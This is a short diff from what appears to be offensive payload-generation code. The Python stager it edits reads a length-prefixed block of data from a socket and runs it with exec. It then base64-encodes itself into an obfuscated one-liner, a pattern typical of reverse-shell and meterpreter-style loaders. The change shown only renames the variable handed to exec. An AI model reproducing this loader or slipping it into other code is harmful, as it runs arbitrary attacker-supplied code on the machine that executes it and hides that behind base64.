@@ -26,7 +26,7 @@ l=struct.unpack('>I',HopeSocketWorksWithoutVariableS.recv(4))[0]
 d=HopeSocketWorksWithoutVariableS.recv(l)
 while len(d)<l:
 	d+=HopeSocketWorksWithoutVariableS.recv(l-len(d))
-exec(d,{'HopeSocketWorksWithoutVariableS':HopeSocketWorksWithoutVariableS})"""
+exec(d,{'s':HopeSocketWorksWithoutVariableS})"""
 payload = base64.b64encode(payload.encode('utf-8'))
 
 payload2 = "import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,\'UTF-8\')}[sys.version_info[0]](\'"+str(payload.decode('utf-8'))+"')))"
